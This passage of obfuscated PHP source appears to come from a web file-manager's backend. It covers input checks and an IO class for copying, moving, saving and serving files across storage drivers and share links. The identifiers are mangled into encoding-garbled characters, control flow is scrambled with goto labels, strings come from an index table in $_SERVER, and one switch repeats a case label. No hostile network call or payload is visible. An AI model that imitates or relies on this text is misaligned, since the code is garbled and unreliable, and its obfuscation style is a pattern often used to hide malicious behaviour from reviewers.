$dÙ∞ÙﬂªæÆ; } return $dÙ∞ÙﬂªæÆ[$Bãå¬îÇ‹¥]; } public static function check($fπãÖÍé¿º, $f˜∂∂Ú¥∏£, $E„”ú‘Ÿ≥â = null) { $DáÀ±√ﬁŒç =& $_SERVER[¯èãÄπµ]; switch ($f˜∂∂Ú¥∏£) { case $DáÀ±√ﬁŒç[7]: return in_array($fπãÖÍé¿º, $E„”ú‘Ÿ≥â); break; case $DáÀ±√ﬁŒç[1865]: return floatval($fπãÖÍé¿º) > $E„”ú‘Ÿ≥â; break; case $DáÀ±√ﬁŒç[1866]: return floatval($fπãÖÍé¿º) < $E„”ú‘Ÿ≥â; break; case $DáÀ±√ﬁŒç[321]: return strlen($fπãÖÍé¿º) >= $E„”ú‘Ÿ≥â[0] && strlen($fπãÖÍé¿º) <= $E„”ú‘Ÿ≥â[1]; break; case $DáÀ±√ﬁŒç[321]: if (is_array($E„”ú‘Ÿ≥â)) { return strlen($fπãÖÍé¿º) >= $E„”ú‘Ÿ≥â[0] && strlen($fπãÖÍé¿º) <= $E„”ú‘Ÿ≥â[1]; break; } else { return strlen($fπãÖÍé¿º) == $E„”ú‘Ÿ≥â; break; } case $DáÀ±√ﬁŒç[317]: return floatval($fπãÖÍé¿º) >= $E„”ú‘Ÿ≥â[0] && floatval($fπãÖÍé¿º) <= $E„”ú‘Ÿ≥â[1]; break; } $C„å§¢ÚÒè = self::reg(!1); $f˜∂∂Ú¥∏£ = isset($C„å§¢ÚÒè[$f˜∂∂Ú¥∏£]) ? $C„å§¢ÚÒè[$f˜∂∂Ú¥∏£] : $f˜∂∂Ú¥∏£; if (substr($f˜∂∂Ú¥∏£, 0, 1) != $DáÀ±√ﬁŒç[8]) { $f˜∂∂Ú¥∏£ = $DáÀ±√ﬁŒç[1867] . $f˜∂∂Ú¥∏£ . $DáÀ±√ﬁŒç[1868]; } return preg_match($f˜∂∂Ú¥∏£, $fπãÖÍé¿º) === 1; } public static function get($EÛØ¶¨Ω∆µ, $AÕ¯É Ò‘Á = null, $FÊºàÙ‘¿ç = null, $fÌùé±ö’« = null) { goto aíÍùÛÖåÑ; d‰ÑµÕõ≈Â: if (!is_null($fÌùé±ö’«)) { $fÆå«Üÿß”[$dÛíΩµï“[1013]] = $fÌùé±ö’«; } if (!is_null($AÕ¯É Ò‘Á)) { $fÆå«Üÿß”[$dÛíΩµï“[1863]] = $AÕ¯É Ò‘Á; } $bå¯∂¯Œ±ë = Input::getArray(array($EÛØ¶¨Ω∆µ => $fÆå«Üÿß”)); goto d¨õ˘∑√¶”; d¨õ˘∑√¶”: return $bå¯∂¯Œ±ë[$EÛØ¶¨Ω∆µ]; goto bÎ÷åôÇÊ∑; aíÍùÛÖåÑ: $dÛíΩµï“ =& $_SERVER[¯èãÄπµ]; $fÆå«Üÿß” = array(); if (!is_null($FÊºàÙ‘¿ç)) { $fÆå«Üÿß”[$dÛíΩµï“[34]] = $FÊºàÙ‘¿ç; } goto d‰ÑµÕõ≈Â; bÎ÷åôÇÊ∑: } } goto c•ÙóÂÒª‰; c©Æíï‚¿Ÿ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($cﬂã‡ä◊ıŸ, $d»‰ÌÇ±˜ç) { $Fƒóƒ‚äˆœ = self::driverMake($d»‰ÌÇ±˜ç[0]); if (method_exists($Fƒóƒ‚äˆœ, $cﬂã‡ä◊ıŸ)) { return @call_user_func_array(array($Fƒóƒ‚äˆœ, $cﬂã‡ä◊ıŸ), $d»‰ÌÇ±˜ç); } if (method_exists($Fƒóƒ‚äˆœ, $_SERVER[¯èãÄπµ][999])) { return @call_user_func_array(array($Fƒóƒ‚äˆœ, $cﬂã‡ä◊ıŸ), $d»‰ÌÇ±˜ç); } else { if (method_exists(self, $cﬂã‡ä◊ıŸ)) { return @call_user_func_array(array(self, $cﬂã‡ä◊ıŸ), $d»‰ÌÇ±˜ç); } else { call_user_func_array(array(parent, $cﬂã‡ä◊ıŸ), $d»‰ÌÇ±˜ç); } } } public static function init($fÑ÷£Ç«ã™) { return self::driverMake($fÑ÷£Ç«ã™); } public static function copy($d‡¿∏÷ËÑ€, $CÿØ“ã«…¯, $BóÒüˆ±ç¢ = false, $CŸÖç¬÷Ó¿ = false) { return self::copyMove($d‡¿∏÷ËÑ€, $CÿØ“ã«…¯, $BóÒüˆ±ç¢, $_SERVER[¯èãÄπµ][486], $CŸÖç¬÷Ó¿); } public static function move($Fçªì©ﬁ∞, $dõÛêÿÿ¯Ò, $b∂ØÔ‡∆£§ = false, $CÑπßÇ¬ﬂê = false) { return self::copyMove($Fçªì©ﬁ∞, $dõÛêÿÿ¯Ò, $b∂ØÔ‡∆£§, $_SERVER[¯èãÄπµ][488], $CÑπßÇ¬ﬂê); } public static function saveFile($eäÔûúú», $EªÑ‚π÷ûú, $EˆÍ»€¡≤¥ = true) { goto Dıò™áÜ¬ú; Dıò™áÜ¬ú: $AÒæ†ØÉ¥É =& $_SERVER[¯èãÄπµ]; $bÏ£Ì√∑ÕÊ = self::info($EªÑ‚π÷ûú); $EÈ±ÖΩÑ‰ = self::driverMake($eäÔûúú»); goto C·ê´±ıπ¬; C·ê´±ıπ¬: $bÚ ΩéŸ∑Ï = self::driverMake($EªÑ‚π÷ûú); $fÉ–çΩ„¥‘ = !1; if ($bÚ ΩéŸ∑Ï->pathParse[$AÒæ†ØÉ¥É[1000]]) { $b”»»ÃøÂÌ = $bÚ ΩéŸ∑Ï->pathParse[$AÒæ†ØÉ¥É[1000]]; $fÉ–çΩ„¥‘ = $bÚ ΩéŸ∑Ï; $bÚ ΩéŸ∑Ï = self::driverMake($b”»»ÃøÂÌ); } goto a›⁄ ÂÃ≥∫; a›⁄ ÂÃ≥∫: $F±“±—¥∆Ï = $bÚ ΩéŸ∑Ï->pathFather($EªÑ‚π÷ûú); $E¿±πÿÈçÖ = !0; if (!$EˆÍ»€¡≤¥ && self::driverIsSame($EÈ±ÖΩÑ‰, $bÚ ΩéŸ∑Ï)) { $E¿±πÿÈçÖ = !1; } goto fè≠ÀµÃö≥; fè≠ÀµÃö≥: $d–±∏™ÆÙ† = self::copyFile($EÈ±ÖΩÑ‰, $eäÔûúú», $bÚ ΩéŸ∑Ï, $F±“±—¥∆Ï, $bÏ£Ì√∑ÕÊ[$AÒæ†ØÉ¥É[28]], $E¿±πÿÈçÖ); if ($fÉ–çΩ„¥‘) { $d–±∏™ÆÙ† = $fÉ–çΩ„¥‘->getPathOuter($d–±∏™ÆÙ†); } return $d–±∏™ÆÙ†; goto eà±ÇıÉ‘Ÿ; eà±ÇıÉ‘Ÿ: } private static function copyMove($c◊Âï¿¿ﬁ, $c¬ËΩÙ≤π≈, $aı‘ÍΩ√˜«, $f ©Ù∞Û∞˜, $Eç€‘Ö‡’ = false) { goto aØˆãåÒ⁄ø; aØˆãåÒ⁄ø: $eàﬁÖ…ƒ«Â =& $_SERVER[¯èãÄπµ]; if (!$c◊Âï¿¿ﬁ || $c◊Âï¿¿ﬁ == $eàﬁÖ…ƒ«Â[8] || !$c¬ËΩÙ≤π≈) { return !1; } ignore_timeout(); goto AÁ¢»íÁÖ∫; fÌ•¿¿ÑÇ§: $DÖ®ê÷†°ä = !1; if ($BéÊÁ©πœß->pathParse[$eàﬁÖ…ƒ«Â[1000]]) { $c¬ËΩÙ≤π≈ = $BéÊÁ©πœß->pathParse[$eàﬁÖ…ƒ«Â[1000]]; $DÖ®ê÷†°ä = $BéÊÁ©πœß; $BéÊÁ©πœß = self::driverMake($c¬ËΩÙ≤π≈); } self::check($EïÒπêëøá, $c◊Âï¿¿ﬁ, $BéÊÁ©πœß, $c¬ËΩÙ≤π≈); goto dã‰±Ï•”‘; AÁ¢»íÁÖ∫: $EïÒπêëøá = self::driverMake($c◊Âï¿¿ﬁ); $BéÊÁ©πœß = self::driverMake($c¬ËΩÙ≤π≈); $AÏÇ∑ë‚Ë≤ = $f ©Ù∞Û∞˜ == $eàﬁÖ…ƒ«Â[488]; goto fÌ•¿¿ÑÇ§; cÃÈ¯ÉÌÃà: $Dπó•›‰∂ü = $EïÒπêëøá->isFile($c◊Âï¿¿ﬁ); if (!$Dπó•›‰∂ü && $BéÊÁ©πœß->getType() == $eàﬁÖ…ƒ«Â[697] && $EïÒπêëøá->getType() == $eàﬁÖ…ƒ«Â[101]) { $b◊ı€ä∫≈ÿ = $BéÊÁ©πœß->copyFolderFromIO($EïÒπêëøá, $c◊Âï¿¿ﬁ, $c¬ËΩÙ≤π≈, $aı‘ÍΩ√˜«, $AÏÇ∑ë‚Ë≤, $Eç€‘Ö‡’); } else { $b◊ı€ä∫≈ÿ = self::copyPath($EïÒπêëøá, $c◊Âï¿¿ﬁ, $BéÊÁ©πœß, $c¬ËΩÙ≤π≈, $aı‘ÍΩ√˜«, $AÏÇ∑ë‚Ë≤, $Dπó•›‰∂ü, $Eç€‘Ö‡’); } if ($b◊ı€ä∫≈ÿ && $AÏÇ∑ë‚Ë≤) { $EïÒπêëøá->remove($c◊Âï¿¿ﬁ); } goto eÑÎø‡´¬î; dã‰±Ï•”‘: Hook::trigger($eàﬁÖ…ƒ«Â[72], $EïÒπêëøá, $c◊Âï¿¿ﬁ, $BéÊÁ©πœß, $c¬ËΩÙ≤π≈); $cÂÈçÔ‡∫§ = self::driverIsSame($EïÒπêëøá, $BéÊÁ©πœß); if ($cÂÈçÔ‡∫§) { if ($f ©Ù∞Û∞˜ == $eàﬁÖ…ƒ«Â[488] && trim($c¬ËΩÙ≤π≈, $eàﬁÖ…ƒ«Â[8]) == trim($BéÊÁ©πœß->pathFather($c◊Âï¿¿ﬁ), $eàﬁÖ…ƒ«Â[8])) { return $BéÊÁ©πœß->getPathOuter($c◊Âï¿¿ﬁ); } if (method_exists($BéÊÁ©πœß, $f ©Ù∞Û∞˜)) { return $BéÊÁ©πœß->{$f ©Ù∞Û∞˜}($c◊Âï¿¿ﬁ, $c¬ËΩÙ≤π≈, $aı‘ÍΩ√˜«); } } goto cÃÈ¯ÉÌÃà; eÑÎø‡´¬î: if ($DÖ®ê÷†°ä) { $b◊ı€ä∫≈ÿ = $DÖ®ê÷†°ä->getPathOuter($b◊ı€ä∫≈ÿ); } return $b◊ı€ä∫≈ÿ; goto fÆÆ¯Ø˜Ù∫; fÆÆ¯Ø˜Ù∫: } private static function check($dÑÿ£Ö¬¨¬, $eã›úµπ·®, $dè«åç”ä‹, &$AÇ¿î—€øÑ) { $eõ´ÍàÕ˜„ =& $_SERVER[¯èãÄπµ]; if (self::driverIsSame($dÑÿ£Ö¬¨¬, $dè«åç”ä‹) && $dÑÿ£Ö¬¨¬->isFolder($eã›úµπ·®) && $dÑÿ£Ö¬¨¬->isParentOf($eã›úµπ·®, $AÇ¿î—€øÑ)) { show_json(LNG($eõ´ÍàÕ˜„[1001]), !1); } if (!$dÑÿ£Ö¬¨¬->exist($eã›úµπ·®)) { show_json(LNG($eõ´ÍàÕ˜„[100]), !1); } } private static function copyPath($CöÛ∫ƒÆ÷‹, $a«·∑¡Ï±È, $döêêÌÎø•, $aÌ…¢Íìõî, $A°å˘•Ë¶ë, $cﬁ‡ñìò¿œ, $Cñ„ì¶ø¶Í, $CèÆ“¿Íãæ = false) { goto B˘ùëáŒîß; dŸ¢—èï≥Ø: $A∆√Ú€Ï¶ñ = $döêêÌÎø•->mkdir($döêêÌÎø•->getPath($Cã¨Çú®Æ)); $aÌ…¢Íìõî = $döêêÌÎø•->getPathInner($A∆√Ú€Ï¶ñ); $CÆŒ‘ß†Àá = $CöÛ∫ƒÆ÷‹->listPath($a«·∑¡Ï±È, !0); goto d†ÇçÍ≠…÷; B˘ùëáŒîß: $Cêπï°◊ëÏ =& $_SERVER[¯èãÄπµ]; $cÑç Ì÷œå = $CèÆ“¿Íãæ ? $CèÆ“¿Íãæ : $CöÛ∫ƒÆ÷‹->getPathName($CöÛ∫ƒÆ÷‹->pathThis($a«·∑¡Ï±È)); if ($A°å˘•Ë¶ë) { $E˜ÙıäÊêä = $döêêÌÎø•->fileNameExist($aÌ…¢Íìõî, $cÑç Ì÷œå); $cÑç Ì÷œå = $döêêÌÎø•->fileNameAuto($aÌ…¢Íìõî, $cÑç Ì÷œå, $A°å˘•Ë¶ë, !$Cñ„ì¶ø¶Í); $A°å˘•Ë¶ë = $E˜ÙıäÊêä ? $A°å˘•Ë¶ë : !1; } goto Fó∏’è¡Ωµ; d†ÇçÍ≠…÷: $fÔ·¿∑ìä† = array_merge($CÆŒ‘ß†Àá[$Cêπï°◊ëÏ[73]], $CÆŒ‘ß†Àá[$Cêπï°◊ëÏ[74]]); foreach ($fÔ·¿∑ìä† as $dŒìÀÖ»ïﬁ) { $Cä·Ößﬁ«ö = $dŒìÀÖ»ïﬁ[$Cêπï°◊ëÏ[29]] == $Cêπï°◊ëÏ[163]; $a«·∑¡Ï±È = $CöÛ∫ƒÆ÷‹->getPathInner($dŒìÀÖ»ïﬁ[$Cêπï°◊ëÏ[75]]); $Eàã—˜çﬁ∆ = self::copyPath($CöÛ∫ƒÆ÷‹, $a«·∑¡Ï±È, $döêêÌÎø•, $aÌ…¢Íìõî, $A°å˘•Ë¶ë, $cﬁ‡ñìò¿œ, $Cä·Ößﬁ«ö); if (!$Eàã—˜çﬁ∆) { write_log($Cêπï°◊ëÏ[1002] . $a«·∑¡Ï±È . $Cêπï°◊ëÏ[1003] . $aÌ…¢Íìõî, $Cêπï°◊ëÏ[1004]); } } return $A∆√Ú€Ï¶ñ; goto fç˜Ó›ãÙÿ; Fó∏’è¡Ωµ: if ($Cñ„ì¶ø¶Í) { return self::copyFile($CöÛ∫ƒÆ÷‹, $a«·∑¡Ï±È, $döêêÌÎø•, $aÌ…¢Íìõî, $cÑç Ì÷œå, $cﬁ‡ñìò¿œ); } if ($A°å˘•Ë¶ë == REPEAT_RENAME_FOLDER) { $A°å˘•Ë¶ë = !1; } $Cã¨Çú®Æ = rtrim($aÌ…¢Íìõî, $Cêπï°◊ëÏ[8]) . $Cêπï°◊ëÏ[8] . $cÑç Ì÷œå; goto dŸ¢—èï≥Ø; fç˜Ó›ãÙÿ: } private static function copyFile($e∏¡ﬁÃ©∞«, $F⁄∏•Ö∞Ã’, $b’≈æ•ÙüÒ, $cùı∑‹¯å‡, $bıóú ⁄ÉÖ, $FøäÇÙˆ—ﬂ) { goto Cñ√â‰Àà„; A≠ô∑áô‚–: mk_dir($bìﬂ‡ÜÌ´Ω); $e√‹©»–¿ö = $bìﬂ‡ÜÌ´Ω . $F¡®àçé®ä; $e√‹©»–¿ö = $e∏¡ﬁÃ©∞«->download($F⁄∏•Ö∞Ã’, $e√‹©»–¿ö); goto dÔ“‘ö‰ÒÏ; dÔ“‘ö‰ÒÏ: $e√‹©»–¿ö = $e∏¡ﬁÃ©∞«->iconvApp($e√‹©»–¿ö); $a¿¶¨∑µ·Ö = $b’≈æ•ÙüÒ->upload($cùı∑‹¯å‡, $e√‹©»–¿ö, $FøäÇÙˆ—ﬂ); self::remove($bìﬂ‡ÜÌ´Ω . $F¡®àçé®ä); goto C ˘ˆ¢⁄‘©; Cñ√â‰Àà„: $dòŸßë’≤‘ =& $_SERVER[¯èãÄπµ]; $cùı∑‹¯å‡ = $b’≈æ•ÙüÒ->getPath(rtrim($cùı∑‹¯å‡, $dòŸßë’≤‘[8]) . $dòŸßë’≤‘[8] . $bıóú ⁄ÉÖ); $F¡®àçé®ä = $dòŸßë’≤‘[1005] . time() . rand_string(5); goto b √Éõ±›Ω; C ˘ˆ¢⁄‘©: Hook::trigger($dòŸßë’≤‘[1007], $e∏¡ﬁÃ©∞«, $F⁄∏•Ö∞Ã’, $b’≈æ•ÙüÒ, $cùı∑‹¯å‡, $bıóú ⁄ÉÖ, $a¿¶¨∑µ·Ö); return $a¿¶¨∑µ·Ö; goto a©¡¿±‘©§; b √Éõ±›Ω: Hook::trigger($dòŸßë’≤‘[1006], $e∏¡ﬁÃ©∞«, $F⁄∏•Ö∞Ã’, $b’≈æ•ÙüÒ, $cùı∑‹¯å‡, $bıóú ⁄ÉÖ, $F¡®àçé®ä); if (self::driverIsSame($e∏¡ﬁÃ©∞«, $b’≈æ•ÙüÒ)) { if ($FøäÇÙˆ—ﬂ) { $a¿¶¨∑µ·Ö = $b’≈æ•ÙüÒ->moveFile($F⁄∏•Ö∞Ã’, $cùı∑‹¯å‡); } else { $a¿¶¨∑µ·Ö = $b’≈æ•ÙüÒ->copyFile($F⁄∏•Ö∞Ã’, $cùı∑‹¯å‡); } Hook::trigger($dòŸßë’≤‘[1007], $e∏¡ﬁÃ©∞«, $F⁄∏•Ö∞Ã’, $b’≈æ•ÙüÒ, $cùı∑‹¯å‡, $bıóú ⁄ÉÖ, $a¿¶¨∑µ·Ö); return $a¿¶¨∑µ·Ö; } $bìﬂ‡ÜÌ´Ω = TEMP_FILES; goto A≠ô∑áô‚–; a©¡¿±‘©§: } public static function pathFather($Cïó≠ÙÓ‚) { $Aœë©¥‡∂ù = IO::init($Cïó≠ÙÓ‚); $dƒπ∑Õ≤ÔÖ = $Aœë©¥‡∂ù->pathFather($Aœë©¥‡∂ù->path); return $Aœë©¥‡∂ù->getPathOuter($dƒπ∑Õ≤ÔÖ); } public static function fileOut($BÌÑ÷ÀÈûË, $eﬂ¶©ÑÀ÷œ = false, $B›‡≈¿’¶Ã = false, $D·¶≈√ÿ≥¥ = '') { $b§û“Ãûø’ = self::driverMake($BÌÑ÷ÀÈûË); if ($b§û“Ãûø’->isFileOutServer()) { return $b§û“Ãûø’->fileOutServer($BÌÑ÷ÀÈûË, $eﬂ¶©ÑÀ÷œ, $B›‡≈¿’¶Ã, $D·¶≈√ÿ≥¥); } return $b§û“Ãûø’->fileOut($BÌÑ÷ÀÈûË, $eﬂ¶©ÑÀ÷œ, $B›‡≈¿’¶Ã, $D·¶≈√ÿ≥¥); } public static function fileOutImage($FÒ±›Âøá·, $Eñ«âëèÉà = 250) { $Bé†∫°Ωºö = array(250, 600, 1200, 3000); for ($Dº÷å≈ÈØ˜ = 0; $Dº÷å≈ÈØ˜ < count($Bé†∫°Ωºö); $Dº÷å≈ÈØ˜++) { if ($Dº÷å≈ÈØ˜ == 0 && $Eñ«âëèÉà <= $Bé†∫°Ωºö[$Dº÷å≈ÈØ˜]) { $Eñ«âëèÉà = $Bé†∫°Ωºö[$Dº÷å≈ÈØ˜]; break; } else { if ($Eñ«âëèÉà > $Bé†∫°Ωºö[$Dº÷å≈ÈØ˜ - 1] && $Eñ«âëèÉà <= $Bé†∫°Ωºö[$Dº÷å≈ÈØ˜]) { $Eñ«âëèÉà = $Bé†∫°Ωºö[$Dº÷å≈ÈØ˜]; break; } else { if ($Dº÷å≈ÈØ˜ == count($Bé†∫°Ωºö) - 1 && $Eñ«âëèÉà > $Bé†∫°Ωºö[$Dº÷å≈ÈØ˜]) { $Eñ«âëèÉà = $Bé†∫°Ωºö[$Dº÷å≈ÈØ˜]; break; } } } } $b¯‡Ω¢ÿÏæ = self::driverMake($FÒ±›Âøá·); if ($b¯‡Ω¢ÿÏæ->isFileOutServer()) { return $b¯‡Ω¢ÿÏæ->fileOutImageServer($FÒ±›Âøá·, $Eñ«âëèÉà); } return $b¯‡Ω¢ÿÏæ->fileOutImage($FÒ±›Âøá·, $Eñ«âëèÉà); } private static function driverIsSame($bÊ¯Ÿ≥Ù€, $Bﬁ…íÒµñÙ) { goto DÊúùÒ— Ó; DÊúùÒ— Ó: $D£πãŸìıÑ =& $_SERVER[¯èãÄπµ]; $B˜”ŸˆÉ≈ü = $bÊ¯Ÿ≥Ù€->getType(); $AÛê≈Œµ™≈ = $Bﬁ…íÒµñÙ->getType(); goto bÚ±ÕÚŸÿ©; bÚ±ÕÚŸÿ©: if ($B˜”ŸˆÉ≈ü != $AÛê≈Œµ™≈) { return !1; } if ($B˜”ŸˆÉ≈ü == $D£πãŸìıÑ[697]) { return !0; } if ($B˜”ŸˆÉ≈ü == $D£πãŸìıÑ[101]) { return !0; } goto Eáì—ëÁƒº; Eáì—ëÁƒº: if ($bÊ¯Ÿ≥Ù€->pathDriver == $Bﬁ…íÒµñÙ->pathDriver) { return !0; } return !1; goto aî£ôàû≠ﬁ; aî£ôàû≠ﬁ: } public static function copyUpdate($E˜’ŒπúÆ◊, $EŒåâ≥Ω√á) { goto DΩ“√«∫‘Ò; Eã¯ì≠îûç: $fü≤¯Æ≥‘ = self::_listAll($E˜’ŒπúÆ◊); $a»´ã‰÷ÈÁ = self::_listAll($EŒåâ≥Ω√á); $Eî°«ÖÒªÜ = array(); goto cá—ç‰©Ã◊; e∞∂«∏Ò„Ó: Hook::trigger($a§ÃŒáçùË[1011], $E˜’ŒπúÆ◊, $EŒåâ≥Ω√á, $dÎﬁπÈ¡≈ª); foreach ($C¡¨Øê‘¨Ï as $DõÜÌë•à≠) { IO::mkdir($DõÜÌë•à≠); } foreach ($Eî°«ÖÒªÜ as $DõÜÌë•à≠) { IO::copy($DõÜÌë•à≠[$a§ÃŒáçùË[1008]], $DõÜÌë•à≠[$a§ÃŒáçùË[1009]], REPEAT_REPLACE); } goto CÃƒÚÑÑí˘; DΩ“√«∫‘Ò: $a§ÃŒáçùË =& $_SERVER[¯èãÄπµ]; if (!IO::exist($E˜’ŒπúÆ◊)) { return !1; } if (!IO::exist($EŒåâ≥Ω√á)) { IO::mkdir($EŒåâ≥Ω√á); } goto Eã¯ì≠îûç; cá—ç‰©Ã◊: $C¡¨Øê‘¨Ï = array(); foreach ($fü≤¯Æ≥‘ as $bñËÙí‘∫≠ => $DõÜÌë•à≠) { if (isset($a»´ã‰÷ÈÁ[$bñËÙí‘∫≠])) { if ($DõÜÌë•à≠[$a§ÃŒáçùË[76]] == 1) { continue; } if ($a»´ã‰÷ÈÁ[$bñËÙí‘∫≠][$a§ÃŒáçùË[77]] == $DõÜÌë•à≠[$a§ÃŒáçùË[77]]) { continue; } } if ($DõÜÌë•à≠[$a§ÃŒáçùË[76]] == 1) { $C¡¨Øê‘¨Ï[] = $EŒåâ≥Ω√á . $a§ÃŒáçùË[8] . $bñËÙí‘∫≠; continue; } $e¡°ù¬¶◊Í = strstr(trim($bñËÙí‘∫≠, $a§ÃŒáçùË[8]), $a§ÃŒáçùË[8]) ? get_path_father($bñËÙí‘∫≠) : $a§ÃŒáçùË[33]; $Eî°«ÖÒªÜ[] = array($a§ÃŒáçùË[1008] => $DõÜÌë•à≠[$a§ÃŒáçùË[75]], $a§ÃŒáçùË[1009] => rtrim($EŒåâ≥Ω√á, $a§ÃŒáçùË[8]) . $a§ÃŒáçùË[8] . $e¡°ù¬¶◊Í, $a§ÃŒáçùË[1010] => $DõÜÌë•à≠); } $dÎﬁπÈ¡≈ª = array($a§ÃŒáçùË[163] => $Eî°«ÖÒªÜ, $a§ÃŒáçùË[76] => $C¡¨Øê‘¨Ï); goto e∞∂«∏Ò„Ó; CÃƒÚÑÑí˘: } private static function _listAll($eùÏã≤ËàÓ) { $aÖŒΩó€§© =& $_SERVER[¯èãÄπµ]; $eùÏã≤ËàÓ = KodIO::clear($eùÏã≤ËàÓ); $c≠≠ıã÷Ü¶ = IO::listAll($eùÏã≤ËàÓ); foreach ($c≠≠ıã÷Ü¶ as &$D“ºÿ∏é«) { $fÿÉ◊«Ü⁄˘ = substr($D“ºÿ∏é«[$aÖŒΩó€§©[75]], strlen($eùÏã≤ËàÓ)); $D“ºÿ∏é«[$aÖŒΩó€§©[1012]] = trim($fÿÉ◊«Ü⁄˘, $aÖŒΩó€§©[8]); } return array_to_keyvalue($c≠≠ıã÷Ü¶, $aÖŒΩó€§©[1012]); } public static function fileSubstr($C±ßﬁ¨†ÃÃ, $DŒÆπ«»ê”, $AÂ“††ﬂÙê = false) { goto E™»ÿüŸÓ–; F«Âë⁄¡¯È: return $BÜÏπ⁄“π->fileSubstr($C±ßﬁ¨†ÃÃ, $DŒÆπ«»ê”, $AÂ“††ﬂÙê); goto bÓ«ÑƒëãΩ; fßÈ¶∆·≥Ñ: if ($DŒÆπ«»ê” + $AÂ“††ﬂÙê > $b´¥Ëäíê·) { $AÂ“††ﬂÙê = $b´¥Ëäíê· - $DŒÆπ«»ê”; } if ($AÂ“††ﬂÙê <= 0) { return $_SERVER[¯èãÄπµ][33]; } if ($DŒÆπ«»ê” < 0 || $DŒÆπ«»ê” >= $b´¥Ëäíê· || $AÂ“††ﬂÙê > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\x65\122\x65\x61\x64\40\x65\162\x72\157\x72\41\x20\163\x74\x61\162\x74\75{$DŒÆπ«»ê”}\73\x6c\145\156\x67\x74\150\75{$AÂ“††ﬂÙê}\73\40\163\x69\x7a\x65\75{$b´¥Ëäíê·}\x3b"); } goto F«Âë⁄¡¯È; bŸÁ£Îëµ›: $b“—ùÈ¿Ÿê = $AÂ“††ﬂÙê; if ($DŒÆπ«»ê” < 0) { $DŒÆπ«»ê” = $b´¥Ëäíê· + $DŒÆπ«»ê”; } if ($AÂ“††ﬂÙê === !1) { $AÂ“††ﬂÙê = $b´¥Ëäíê· - $DŒÆπ«»ê”; } goto fßÈ¶∆·≥Ñ; E™»ÿüŸÓ–: $BÜÏπ⁄“π = self::driverMake($C±ßﬁ¨†ÃÃ); $b´¥Ëäíê· = $BÜÏπ⁄“π->size($C±ßﬁ¨†ÃÃ); $béäÔûÓÕ¶ = $DŒÆπ«»ê”; goto bŸÁ£Îëµ›; bÓ«ÑƒëãΩ: } private static function driverMake(&$BÑ·⁄ﬁÈî’) { goto d›™íó˜üπ; d›™íó˜üπ: $bÙÕÿ‚ªèà =& $_SERVER[¯èãÄπµ]; $A†ìù˘Óã´ = KodIO::parse($BÑ·⁄ﬁÈî’); if (!self::$driverListSystem) { $CÎ™’Àñóª = Model($bÙÕÿ‚ªèà[707])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($CÎ™’Àñóª, $bÙÕÿ‚ªèà[363]); } goto e¶ñÁ≤≈ß£; e¶ñÁ≤≈ß£: if ($A†ìù˘Óã´[$bÙÕÿ‚ªèà[29]] == KodIO::KOD_IO && !self::$driverListSystem[$A†ìù˘Óã´[$bÙÕÿ‚ªèà[363]]]) { return !1; } $BÑ·⁄ﬁÈî’ = $A†ìù˘Óã´[$bÙÕÿ‚ªèà[1013]]; $dÙªÜ¬π¢ä = self::driverGet($A†ìù˘Óã´, $BÑ·⁄ﬁÈî’); goto bãÙöª–«Ø; bãÙöª–«Ø: return $dÙªÜ¬π¢ä; goto cóøíë‡àæ; cóøíë‡àæ: } private static function driverGet($A¡ﬁîèªıà, &$bœΩèﬂÚ·Ÿ) { goto d•‰ñÁøÖê; f¨ò˘ô±é©: $eÔ‘÷ôÜ‹Ô = self::$driverCache[$báûÜ÷∏º‰]; $eÔ‘÷ôÜ‹Ô->pathDriver = $fÖâÖ§≤†ô; $eÔ‘÷ôÜ‹Ô->pathBase = $c√∑ÈêáÀª[33]; goto Bﬂä´å‰€Î; e·Ñ⁄…™…É: $eÔ‘÷ôÜ‹Ô->path = $bœΩèﬂÚ·Ÿ; return $eÔ‘÷ôÜ‹Ô; goto B‰¿ëèçÜ‹; aÔìπÔ¶Ü: switch ($A¡ﬁîèªıà[$c√∑ÈêáÀª[29]]) { case KodIO::KOD_IO: $cÙÚÇÊ¯¨≤ = self::$driverListSystem[$cÌó÷ñÎŒÕ]; break; case KodIO::KOD_SOURCE: $bœΩèﬂÚ·Ÿ = $cÌó÷ñÎŒÕ . $bœΩèﬂÚ·Ÿ; $cÙÚÇÊ¯¨≤ = array($c√∑ÈêáÀª[1015] => $c√∑ÈêáÀª[1016], $c√∑ÈêáÀª[6] => $A¡ﬁîèªıà); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $EµÕ∞Õ¶¢ô = $GLOBALS[$c√∑ÈêáÀª[1017]]; self::$driverListUser = array_to_keyvalue($EµÕ∞Õ¶¢ô, $c√∑ÈêáÀª[363]); } $cÙÚÇÊ¯¨≤ = self::$driverListUser[$cÌó÷ñÎŒÕ]; break; case KodIO::KOD_SHARE_LINK: $cÙÚÇÊ¯¨≤ = array($c√∑ÈêáÀª[1015] => $c√∑ÈêáÀª[1018], $c√∑ÈêáÀª[6] => $A¡ﬁîèªıà); $fëò‚Ö∞´œ = Action($c√∑ÈêáÀª[1019])->sharePathInfo($A¡ﬁîèªıà[$c√∑ÈêáÀª[75]]); $bœΩèﬂÚ·Ÿ = $fëò‚Ö∞´œ[$c√∑ÈêáÀª[365]]; if (!$fëò‚Ö∞´œ[$c√∑ÈêáÀª[365]]) { $aº‘âû …© = Model($c√∑ÈêáÀª[532])->getInfo($fëò‚Ö∞´œ[$c√∑ÈêáÀª[437]]); $bœΩèﬂÚ·Ÿ = KodIO::clear($aº‘âû …©[$c√∑ÈêáÀª[1020]] . $A¡ﬁîèªıà[$c√∑ÈêáÀª[1013]]); $A¡ﬁîèªıà[$c√∑ÈêáÀª[435]] = $aº‘âû …©; $A¡ﬁîèªıà[$c√∑ÈêáÀª[1000]] = $bœΩèﬂÚ·Ÿ; $cÙÚÇÊ¯¨≤ = array($c√∑ÈêáÀª[1015] => $c√∑ÈêáÀª[1021], $c√∑ÈêáÀª[6] => $A¡ﬁîèªıà); } break; case KodIO::KOD_SHARE_ITEM: $cÙÚÇÊ¯¨≤ = array($c√∑ÈêáÀª[1015] => $c√∑ÈêáÀª[1022], $c√∑ÈêáÀª[6] => $A¡ﬁîèªıà); $aº‘âû …© = Model($c√∑ÈêáÀª[532])->getInfo($A¡ﬁîèªıà[$c√∑ÈêáÀª[363]]); if ($aº‘âû …©[$c√∑ÈêáÀª[365]] == $c√∑ÈêáÀª[464]) { $bœΩèﬂÚ·Ÿ = KodIO::clear($aº‘âû 